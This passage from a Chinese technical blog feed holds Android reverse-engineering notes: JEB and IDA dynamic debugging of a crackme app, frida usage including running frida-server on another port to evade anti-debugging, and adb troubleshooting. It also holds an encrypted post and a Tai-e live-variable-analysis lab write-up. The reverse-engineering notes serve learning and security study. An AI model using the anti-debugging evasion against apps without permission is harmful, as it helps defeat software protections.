href="https://aquilao.github.io/Blog/Decompile_apk/">https://aquilao.github.io/Blog/Decompile_apk/</a></li></ul><h2 id="jeb动调"><a class="markdownIt-Anchor" href="#jeb动调"></a> jeb动调</h2><p>​之后就可以在 jeb 中启动动态调试了，首先在 jeb 中相应语句下断点 <code>ctrl + b</code>，之后debug模式启动app</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">分析</span><br>adb shell am start -D -n &lt;包名&gt;/.&lt;类名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里类名前面的文字和包名相同，所以使用<span class="hljs-string">&quot;.&quot;</span>来替代，如果不同就需要写完整路径了</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">am start -n 表示启动一个activity，也可以用这种方式直接启动MainActivity之外的Activity</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">am start -D 表示将应用设置为可调试模式</span><br>adb forward tcp:port jdwp:PID<br>jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=xxx<br></code></pre></td></tr></table></figure><p>​然后jeb直接附加程序进行动调即可，具体步骤看这个 -&gt; <a href="https://www.52pojie.cn/thread-1598242-1-1.html">JEB动态调试Smali-真机/模拟器(详细，新手必看) - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h2 id="ida-调试"><a class="markdownIt-Anchor" href="#ida-调试"></a> IDA 调试</h2><p>​分为两种模式，一种是以attach模式启动，第二种则以debug模式启动，二者的区别在于使用场景，有时候要动态调试的参数在app一启动的时候就产生了，时机较早，所以需要以debug模式去挂起app。</p><h3 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h3><p>​首先使用IDA静态分析so文件，之后如果需要修改查看上方 <code>修改so文件</code>。修改之后进行动态调试，根据attach的流程一步步进行，之后在右侧 <code>Module</code> 板块中寻找相应的so文件，查看基址，然后再根据相对地址加基址在代码中按<code>G</code>跳转，之后相应位置下断点，按 <code>F9</code> 运行之后回到apk中进行操作，然后在调用so文件时在断点中断。</p><p>​这里需要在 IDA <code>Debugger -&gt; Debugger options</code> 中进行设置，防止因为别的进程等事宜暂停</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403071846837.png" alt="image-20240307184601695" /></p><h3 id="attach模式"><a class="markdownIt-Anchor" href="#attach模式"></a> attach模式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">首先在adb中运行android-server</span><br>adb shell ./data/loval/tmp/android-server<br><span class="hljs-meta prompt_"># </span><span class="language-bash">之后进行端口转发，使用adb forward命令之后，adb.exe(server)会监听23946端口等待IDA连接，同时连接移动端android-server的23946端口</span><br>adb forward tcp:23946 tcp:23946 # 这里修改端口可以使用 ./android-server -p 19233，然后转发对应的端口，最后在IDA中填写相应端口即可<br><span class="hljs-meta prompt_"># </span><span class="language-bash">然后直接运行apk即可，下面语句也是运行apk的语句</span><br>adb shell am start -n com.zj.wuaipojie/.ui.ChallengeEight <br></code></pre></td></tr></table></figure><p>​最后在IDA中选择 <code>Remote ARM Linux/Android debugger</code>，然后设置IP为 127.0.0.1 端口匹配即可调试so文件。这里注意尽量保持一个设备在场，开启as的话，IDA会识别到别的虚拟机中去。</p><h3 id="debug模式"><a class="markdownIt-Anchor" href="#debug模式"></a> debug模式</h3><p>​按照这个进行操作 -&gt; <a href="https://www.52pojie.cn/thread-1315444-1-7.html">实战分析一个Crackme的过程 </a>。因为so文件的加载前会先执行JNI_Onload，如果要反反调试，那么可能就需要在JNI_Onload中打断点了。<a href="https://www.cnblogs.com/revercc/p/16175186.html">原理讲解</a></p><h3 id="ida找不到so的情况"><a class="markdownIt-Anchor" href="#ida找不到so的情况"></a> ida找不到so的情况</h3><ul><li>因为APK设置了该属性<code>android:extractNativeLibs=&quot;false&quot;</code>，所有在apk的安装目录中不显示so文件，这个时候可以直接将 <strong>base.apk</strong> 作为so文件进行处理</li><li>或者可以尝试手动复制一份对应的so文件放到<code>data/app/&lt;package-name&gt;/lib</code>目录下</li></ul><h3 id="安卓高版本android10及以上与低版本的差异"><a class="markdownIt-Anchor" href="#安卓高版本android10及以上与低版本的差异"></a> 安卓高版本(android10及以上)与低版本的差异</h3><ul><li>高版本因为libc.so的路径改变了，所以显示不出所有的线程。<code>IDA_LIBC_PATH=/apex/com.android.runtime/lib64/bionic/libc.so ./android_server64</code> 启动服务可以完整显示</li></ul><h1 id="frida"><a class="markdownIt-Anchor" href="#frida"></a> frida</h1><p>​Frida-tools共有六个小工具分别是frida CLI、frida-ps、frida-trace、frida-discover、frida-ls-devices、frida-kill。</p><h2 id="frida-2"><a class="markdownIt-Anchor" href="#frida-2"></a> frida</h2><h3 id="参数讲解"><a class="markdownIt-Anchor" href="#参数讲解"></a> 参数讲解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">--version   # 显示程序的版本号并退出<br>-h, --help  # 显示此帮助信息并退出<br>-D ID, --device=ID   # 连接到指定ID的设备上<br>-U, --usb# 连接到USB设备<br>-R, --remote         # 连接到远程frida服务器<br>-f FILE, --file=FILE # spawn这个应用<br>-F, --attach-frontmost    # 附加到最前端的应用程序<br>-p PID, --attach-pid=PID  # 附加到PID<br>--debug  # 启用兼容Node.js的脚本调试器<br>-l SCRIPT, --load=SCRIPT # 加载脚本。<br>-q # 安静模式（无提示），并在-l和-e之后退出。<br>--no-pause # 启动后自动启动主线程<br>-o LOGFILE, --output=LOGFILE # 输出到日志文件<br></code></pre></td></tr></table></figure><h3 id="启动"><a class="markdownIt-Anchor" href="#启动"></a> 启动</h3><ul><li>attach模式</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">frida -UF #测试是否连接成功<br>frida -U 进程名(通常为包名) -l hook.js<br></code></pre></td></tr></table></figure><ul><li>spawn模式</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">frida -U -f com.android.settings(包名) -l hook.js --no-pause(后面--no……高版本不写)<br></code></pre></td></tr></table></figure><h2 id="frida-server"><a class="markdownIt-Anchor" href="#frida-server"></a> frida-server</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /data/adb/tools#frida-server放在了这个目录下<br>chmod 777 *<br>./frida-server-16.0.8-android-arm64<br><span class="hljs-meta prompt_"># </span><span class="language-bash">防止反调试，切换端口监听(默认端口为27042)，这里监听任何对手机1314端口的网络连接，需要注意端口转发问题</span><br>./frida-server-16.0.8-android-arm64 -l 0.0.0.0:1314<br>adb forward tcp:1314 tcp:1314<br><span class="hljs-meta prompt_"># </span><span class="language-bash">可见查看frida监听的端口</span><br>netstat -tulp | grep frida<br></code></pre></td></tr></table></figure><h2 id="frida-ps"><a class="markdownIt-Anchor" href="#frida-ps"></a> frida-ps</h2><p>​frida-ps用于列出进程的一个命令行工具。</p><h3 id="参数讲解-2"><a class="markdownIt-Anchor" href="#参数讲解-2"></a> 参数讲解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">--version # 显示程序的版本号并退出<br>-h, --help # 显示此帮助信息并退出<br>-D ID, --device=ID# 连接到指定ID的设备上<br>-U, --usb# 连接到USB设备<br>-R, --remote # 连接到远程frida服务器<br>-H HOST, --host=HOST # 连接到HOST上的远程frida-server。<br>-O FILE, --options-file=FILE # 包含额外命令行选项的文本文件<br>-a, --applications# 仅列出应用程序<br>-i, --installed # 包括所有已安装的应用程序<br>-j, --json # 以JSON格式输出结果<br></code></pre></td></tr></table></figure><h3 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前手机运行的进程</span><br>frida-ps -U<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看设备所有应用程序</span><br>frida-ps -Ua<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看设备上的所有已安装应用程序和对应的名字</span><br>frida-ps -Uai<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获得设备的进程名和包名</span><br>frida-ps -U -a<br></code></pre></td></tr></table></figure><h2 id="rpc"><a class="markdownIt-Anchor" href="#rpc"></a> rpc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Java.perform(function () </span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">        var jni_env = Java.vm.getEnv();</span><br><span class="hljs-string">        console.log(jni_env);</span><br><span class="hljs-string">        send(jni_env);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string"> &quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_rpc</span>():<br>    <span class="hljs-comment"># 连接到应用程序，这里注意需要使用frida-ps寻找的包名</span><br>    process = frida.get_usb_device().attach(<span class="hljs-string">&#x27;test01&#x27;</span>)<br>    script = process.create_script(jscode)<span class="hljs-comment"># 创建脚本</span><br>    script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<span class="hljs-comment"># 信息处理</span><br>    script.load()<span class="hljs-comment"># 加载脚本</span><br>    <span class="hljs-keyword">return</span> script.exports<span class="hljs-comment"># 返回脚本的导出值</span><br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rpc = start_rpc()<br>    sys.stdin.read()<br></code></pre></td></tr></table></figure><h1 id="错误汇总"><a class="markdownIt-Anchor" href="#错误汇总"></a> 错误汇总</h1><h2 id="程序安装"><a class="markdownIt-Anchor" href="#程序安装"></a> 程序安装</h2><h3 id="删除问题"><a class="markdownIt-Anchor" href="#删除问题"></a> 删除问题</h3><p>​使用 <code>adb install -t xxxx.apk</code> 报错(-t是覆盖安装)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb: failed to install .\xxxx.apk: Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE: Package xxxx signatures do not match previously installed version; ignoring!]<br></code></pre></td></tr></table></figure><p>​这里是因为原先的文件还存在，覆盖保存之前文件导致签名不对。如果用手机自带的卸载不能卸载干净，所以需要使用adb卸载干净</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb uninstall &lt;package-name&gt;<br></code></pre></td></tr></table></figure><h3 id="签名问题"><a class="markdownIt-Anchor" href="#签名问题"></a> 签名问题</h3><p>​使用 <code>adb install xxxx.apk</code> 安装报错</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">adb<span class="hljs-operator">:</span> failed <span class="hljs-keyword">to</span> install .\xxxx.apk<span class="hljs-operator">:</span> Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES<span class="hljs-operator">:</span> Failed <span class="hljs-keyword">to</span> collect certificates from <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>app<span class="hljs-operator">/</span>vmdl2062104312.tmp<span class="hljs-operator">/</span><span class="hljs-keyword">base</span>.apk<span class="hljs-operator">:</span> Attempt <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> length <span class="hljs-keyword">of</span> <span class="hljs-literal">null</span> <span class="hljs-type">array</span>]<br></code></pre></td></tr></table></figure><p>​这里是因为没有签名，之后再签名即可</p><h2 id="adb错误"><a class="markdownIt-Anchor" href="#adb错误"></a> adb错误</h2><h3 id="连不上设备"><a class="markdownIt-Anchor" href="#连不上设备"></a> 连不上设备</h3><p>报错 <code>daemon not running； starting now at tcp:5037</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb kill-server# 如果使用devices没有显示设备，尝试先杀死服务，然后连接报错就进行下面的流程<br>netstat -ano | findstr 5037# 找出占用5037端口的应用的pid<br>taskkill -f -pid &lt;pid&gt;# 关闭掉该应用<br></code></pre></td></tr></table></figure><h1 id="资源汇总"><a class="markdownIt-Anchor" href="#资源汇总"></a> 资源汇总</h1><ul><li><p><a href="https://mt2.cn/">MT管理器 (mt2.cn)</a></p></li><li><p><a href="https://github.com/githubXiaowangzi/NP-Manager?tab=readme-ov-file">NP管理器 githubXiaowangzi/NP-Manager:</a></p></li><li><p><a href="https://magiskcn.com/">Magisk中文网 (magiskcn.com)</a></p></li><li><p><a href="https://lsposed.cn/">LSPosed中文网</a>，<a href="https://github.com/LSPosed/LSPosed">LSPosed/LSPosed: LSPosed Framework</a> -&gt; zip到手机中，使用面具安装</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>心得体会</title>
    <link href="/posts/cf26faba.html"/>
    <url>/posts/cf26faba.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8eaae180fc530a0e8398cc35a2f803389521ad79e60fe1718db5b6587bc049ec">b61ac2957fe6e5696172d47e7b49d1ddbbc6337abdf627161c76f9507780f653d1a054b52b984b0a9be7cb35b6554b7c631ea1d34498e1b5c077c6c73bd69540e7493aaef9f4bdbac83242efbe7dd809a9967772cc9b7e9ed69d017236cf9019a5d69bb0c0c0c92c9ede89a04f3b3b7a586624c03a6cd5bd78eee6fe26abcedbf3151d4d2a087c42e4837e94026c5cff3de16c0bb66720d242c49e7429ec92ea6b0fae7f3712c69fd2b9f30ffbcabf6b163edbe0b064394c910b655f6f4d889e589ccc64206897879695abade2a0dd1464ee3d8a652e9c9e8f13501c6129e0b6a6e198a368d10d8453ad031d929d4caec0ef6ed24bdee269137c66a836a7e14e3fa0e50330237260d4f1b9aa4b3a3ba2d7dcc28fb479bd232439dddb9e9819ea6b1b0ddcd2b5b1e4323518e2ffc3956f493d31439f5b89dc24c494939f2489b177bc278b1cf9d011ebd7083ce299ff538343ae9b7be2ad2a0c99bd97867891699393ae686858005b83e66f335a51242df4337cd76413c32de066418b389894dec5d0d82e1a388743cb4e21e29b76e8d0e496e3a29249c8eaddda85d8648bc8f36881deeb7f52455af68ff99bad5651900f92bb7084d6049a8d769413a0eb5dca8e39aba51a69e984d05c44ab7b368236e7a885e3d857455b7085a1932751e016022ccd893cfd5659108867e5afe60598aef70a0d530ef5f71dbf90ad1d4c2dea2701a0a66adf714aa8860f1954b82e34935fcbba63418558d5401b013e0d61132b1ea67876e5fe62173f8b2a1be442501089a8a366165e5f7f14a83fadc27dab8bfa81c5fe7ae7618584f779d018a518f886e2b11c5c795eb9f269fe48277b33c81d24d76d851366e1959b7ea2ddf950665e55af017a563c54f010c9e265855ab56473e172bd5f12c257e42aa4e8a539d26e9cc22b52b9945a2eba7e19f9bc9b426fb3b3120d6ea71518e329f9cda397e4c3c7c7a08ce0964885070b499a913f7325e32a52111d36443ff1019b9810e4decd3a4364cead18e0f83b5be16b954bbcbbbfe083190b522beaeaf3583147120317114e7e506cc17d6d2f1771d041e0dd04c7e9aa709d757769b5d653ebc6d8bcdf860b4acfd9a4c5f6a72bf2f2a1045270983bd7f1bea4799849cb7b97b83f8c817f810f483dc7076bd13652478cb5c29ba5e1c06a68e38a0649a9aede794a51ca1eaadfb7babafae7148581982d8b8310fd4e9ede179e57ea77419683799d7b2852129e3d7f93196c3aefa5d2ec4ccaea857a6bb0e8ce9053512500806a3e422a5b82a640bf94c5ff7a71119d5687aa8ab78b2252e5763e38699cd0cd9c8215634acdedbb4b64add39792ed3c9f2c743361498ae2940b4bdd08cec3bc8bfc89b2fc87bb4bfb4fcfcfd8923d56b540aacd617d6f33246a9726924a468e70dc69c94f47073f974ed31e1eb7684f381f54f9ee7f54fea49c91914fc04a1f7942bcac6baa627dfccc7154982bdcd8a4e677b445915d89bbbc034edc41c9ddfba7703c6f0f834bf4d4387c65e60946ddfe4dae5cdf68922da5b12729764178428de0e74415620a9ab526d84b31ed351220cfc67ed4172772cd6efb5ba508120c2ea53ddc755945a59753c5789c509327d975da7c5a44c35c7c53c3e8506da8713facc652dccab05c81df3a1458e8f6423bf6d18f6b9b372506b7fe650bf2bf32eb9417ad885a05746a44e48c7ff06ab1027d8956f617f6823d962d880d4cdceae3ea3e058c9952be7efb7993de5f492a4fa3ca820a40c30ea293a23a7e48f21f2d28ebaef751d6225327a65c84f0fe19847e3db33bb82af7fb069d33a9c59823c5acc0fa1e50112beb9fe6cdce3f210df2e0be743c5df4f1b415d84b74e985ba2908a6c92af3b79898e07ca0a2eda905600d2f98b54628afd33b72987858509f39389b72996137166e35736263c739275cd26b09b74f6b678ecf04b014d6fa32f8a7f8bf9fe3f3f5a97bfe2fe00941ef8e03222306a53fa65ad983f783154409f1f153d5e504d4731598b2d4c40248c3d11af8ad763f54646d0f68dfb6c0c9a5a41250eab678b901d11403fb1409ecaf5bc76a1699bdf0caf6a168b07020fd7d95f01e414665175b6b861aa3794d44a572b395e64e5ac2fb1faaed35396642673a2ae45d56dc2716ad1e8293bddb3a7c5bc85eb0566d2c4db38443f7fddc83916b7c9681767a49c3853ff04992e707931473d0359cfc2587e0912fd9eb0dce6a750fc4bae8acf760a1ff494ef02880e285</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab1</title>
    <link href="/posts/f88cd8e5.html"/>
    <url>/posts/f88cd8e5.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab1"><a class="markdownIt-Anchor" href="#lab1"></a> Lab1</h1><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><blockquote><p>实现活跃变量分析和通用的迭代求解器</p></blockquote><p>​这里活跃变量分析就是指初始化和状态转移，控制流约束的部分；而迭代求解器就是通用的整个流程的处理</p><h2 id="活跃变量分析"><a class="markdownIt-Anchor" href="#活跃变量分析"></a> 活跃变量分析</h2><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.dataflow.analysis.DataflowAnalysis</code><ul><li>这是一个抽象的数据流分析类，是<strong>具体的数据流分析与求解器之间的接口</strong>，数据流分析就是对于数据流动过程的处理，而求解器则是对于整个循环算法的实现。一个具体的数据流分析(如活跃变量分析)需要实现它的接口，而求解器(如迭代求解器)需要通过它的接口来求解数据流。</li><li>它是一个 <code>interface</code> , 其中包含 <code>newBoundaryFact</code>,<code>newInitialFact</code>,<code>meetInto</code>,<code>transferNode</code>的实现声名</li><li>包含 <code>&lt;Node&gt;</code> 类型, 它表示 CFG 的 BB</li><li>包含 <code>&lt;Fact&gt; </code> 类型, 它表示数据流分析中用来描述程序状态的元素, 即有关程序代码的信息或属性。它与Node联系在一起，表示一个{name: information}，即这里的 “facts” 是指分析确定的信息，如在某个程序点活跃的变量集。facts 是对于一个程序点而言的，而一个 BB 拥有IN和OUT两个程序点，所以在进行<code>meetInto</code>和<code>transferNode</code>操作时，会有两个<code>SetFact&lt;Var&gt;</code>类型的变量(<code>&lt;Fact&gt;</code>指的是要分析数据中的一个，而<code>SetFact&lt;Var&gt;</code>才是指每一次经过 BB 分析的所有数据(这里指针对一个BB)，注意实现的时候，LiveVariableAnalysis的具体实现与DataflowAnalysis的定义有所不同，进行了方法重载)</li></ul></li><li><code>pascal.taie.analysis.dataflow.analysis.LiveVariableAnalysis</code><ul><li>这个类通过实现 <code>DataflowAnalysis</code> 的接口来定义具体的活跃变量分析。</li><li>LiveVariableAnalysis 继承抽象类 AbstractDataflowAnalysis, AbstractDataflowAnalysis 继承接口 DataflowAnalysis</li></ul></li><li><code>pascal.taie.analysis.dataflow.fact.SetFact&lt;Var&gt;</code><ul><li>这个泛型类用于把 data-flow fact 组织成一个集合。</li></ul></li></ul><h3 id="ir"><a class="markdownIt-Anchor" href="#ir"></a> ir</h3><ul><li><p><code>pascal.taie.ir.exp.Exp</code></p><ul><li>这是 Tai-e 的 IR 中的一个关键接口，用于表示程序中中间语言(IR)的所有表达式。</li><li>表达式主要分为两类 LValue 和 RValue，前者表示赋值语句左侧的表达式，后者对应地表示赋值语句右侧的表达式。对于 IR 的可能表达式(x=1, x=a+b,x.f=a+b,x[i]=3)等，可以很清晰分析出表达式的种类。同时这里表达式(注意区分表达式expression和语句statement，这个在后面很关键，看下面的区分详解)变量Var既可用于左值，也可用于右值</li></ul></li><li><p><code>pascal.taie.ir.stmt.Stmt</code></p><ul><li><p>这是 Tai-e 的 IR 中的另一个关键接口，它用于表示程序中的所有<strong>语句</strong>。对于一个典型的程序设计语言来说，<strong>每个表达式都属于某条特定的语句</strong>。这里statement泛指所有的语句，其中至多只可能定义一个变量、而可能使用零或多个变量。</p></li><li><p>通过这两个接口，可以获得某条语句中定义或使用的所有表达式中的变量<code>Optional&lt;LValue&gt; getDef()</code>，<code>List&lt;RValue&gt; getUses()</code></p></li></ul></li><li><p>这里注意区分表达式和语句的区别</p><ul><li>表达式(exp)通常用来计算值，它们可能由常量、变量、操作符(如加减乘除)以及函数调用组合而成。比如算数表达式 <code>a + b</code>, 方法调用 <code>foo()</code></li><li>语句(stmt)是执行的单位，它们执行操作可能会改变程序的状态。包括赋值，控制流决策，循环等，比如赋值语句 <code>x = a + b</code> 包含了赋值操作，和算术表达式 <code>a + b</code></li><li>因此，表达式是构成语句的元素，而语句则用表达式来执行程序中的操作。在数据流分析中，理解一个语句如何使用和定义表达式是至关重要的，因为它影响了变量在程序执行过程中的生命周期和作用域。</li><li>这里<a href="https://www.zhihu.com/question/20750344/answer/2154359337">引用</a>别人的回答 “表达式可以当做值赋给变量，语句不可以。写编译器匹配语法时，变量定义赋值语句的时候就知道必须要把expression和statement分开了，expression可以当做变量放到赋值语句右值的位置，也可以当做函数的参数，而statement用来组成block和program。”</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​这里主要是实现ConstantPropagation类的四个方法</p><ol><li><code>public SetFact&lt;Var&gt; newBoundaryFact()</code></li><li><code>public SetFact&lt;Var&gt; newInitialFact()</code></li><li><code>public void meetInto(SetFact&lt;Var&gt; fact, SetFact&lt;Var&gt; target)</code></li><li><code>public boolean transferNode(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out)</code></li></ol><p>这里分别代表着对于边界的初始化，对于BB基本块的初始化，数据流交汇的操作以及状态转移方程的操作</p><h4 id="newboundaryfact"><a class="markdownIt-Anchor" href="#newboundaryfact"></a> newBoundaryFact</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SetFact&lt;Var&gt; <span class="hljs-title function_">newBoundaryFact</span><span class="hljs-params">(CFG&lt;Stmt&gt; cfg)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">//返回边界节点的向量，backward 的边界节点是 IN[exit] = 空</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetFact</span>&lt;&gt;();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="newinitialfact"><a class="markdownIt-Anchor" href="#newinitialfact"></a> newInitialFact</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SetFact&lt;Var&gt; <span class="hljs-title function_">newInitialFact</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">// 返回初始化节点的向量，backward 的IN[B]=空</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetFact</span>&lt;&gt;();<br>&#125;<br></code></pre></td></tr></table></figure><p>​这两个初始化的数据都是一样为空</p><h4 id="meetinto"><a class="markdownIt-Anchor" href="#meetinto"></a> meetInto</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">meetInto</span><span class="hljs-params">(SetFact&lt;Var&gt; fact, SetFact&lt;Var&gt; target)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">// target是OUT,将facts结合到target上</span><br>    target.union(fact);<br>&#125;<br></code></pre></td></tr></table></figure><p>​对于 <code>meetInto</code> 而言，它是将OUT分别于不同的IN来进行交汇，这样就不会多创造一个中间值来存储IN交汇的数据。同时出现了一些不变的 IN fact，可以直接忽略这一分支的IN，提高效率</p><h4 id="transfernode"><a class="markdownIt-Anchor" 